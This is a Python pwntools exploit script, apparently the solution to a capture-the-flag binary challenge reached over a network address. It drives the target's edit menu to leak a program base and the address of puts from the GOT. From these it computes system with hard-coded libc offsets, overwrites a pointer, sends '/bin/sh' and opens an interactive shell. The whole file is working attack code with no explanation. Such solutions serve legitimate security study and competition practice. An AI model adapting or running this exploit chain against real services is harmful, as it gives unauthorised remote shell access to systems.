import argparse
import struct

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

r.sendlineafter("Edit value", "2")
r.sendlineafter("Text", "2")
r.sendlineafter("New value:", "")
r.sendlineafter("Edit value", "1")
r.sendlineafter("Text\n", "1")
r.recvline()

prog_base = int(r.recvline().split(b':')[-1]) - 0x34c0
puts_got = prog_base + 0x3408

r.sendlineafter("Edit value", "2")
r.sendlineafter("Text", "1")
r.sendlineafter("New value:", str(puts_got))
r.sendlineafter("Edit value", "1")
r.sendlineafter("Text\n", "2")
r.recvline()

puts = struct.unpack("<Q", r.recvline()[0:6] + b"\x00\x00")[0]
print(hex(puts))
system = puts + (0x50d60 - 0x80ed0)
print(hex(system))

r.sendlineafter("Edit value", "2")
r.sendlineafter("Text", "2")
r.sendlineafter("New value:", struct.pack("<Q", system)[0:6])
r.sendline("2")
r.sendline("1")
r.sendline("0")
r.sendline("2")
r.sendline("2")
r.sendline("/bin/sh")
r.sendline("1")
r.sendline("2")

r.interactive()
